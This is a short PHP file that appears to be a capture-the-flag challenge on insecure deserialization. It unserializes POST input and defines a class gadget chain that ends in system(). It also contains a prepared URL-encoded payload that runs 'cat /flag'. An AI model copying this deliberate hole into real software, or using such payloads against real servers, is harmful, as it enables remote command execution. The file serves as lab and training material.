<?php
highlight_file(__FILE__);
class A{
    private $name;
    public function __construct($name)
    {
        $this->name = $name;
    }
    public function __destruct()
    {
        echo "hello".$this->name;
    }
}

class B{
    public function eval($cmd) {
        system($cmd);
    }
}

class C{
    private $c;
    private $name;
    public function __construct()
    {
        $this->c = new D;
        $this->name = array(0=>"dir",1=>"");
    }
    public function __toString()
    {
        $this->c->get($this->name);
    }

    public function get($name)
    {
        die("hellp $name");
    }

}

class D{
    private $func="system";
    public function get($cmd) {
        call_user_func_array($this->func, $cmd);
    }
}
if(isset($_POST['name'])) {
    $name = unserialize($_POST['name']);
}
// $a = new A(new C);
// echo urlencode(serialize($a));
$b = 'O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00name%22%3BO%3A1%3A%22C%22%3A2%3A%7Bs%3A4%3A%22%00C%00c%22%3BO%3A1%3A%22D%22%3A1%3A%7Bs%3A7%3A%22%00D%00func%22%3Bs%3A6%3A%22system%22%3B%7Ds%3A7%3A%22%00C%00name%22%3Ba%3A2%3A%7Bi%3A0%3Bs%3A9%3A%22cat /flag%22%3Bi%3A1%3Bs%3A0%3A%22%22%3B%7D%7D';
$b = unserialize(urldecode($b));
// $b = 'O:1:"A":2:{s:6:"name";O:1:"C":2:{s:3:"c";O:1:"D":1:{s:7:"Dfunc";s:6:"system";}s:7:"Cname";a:2:{i:0;s:3:"dir";i:1;s:0:"";}}}';
// unserialize($b);

throw new Exception("bye");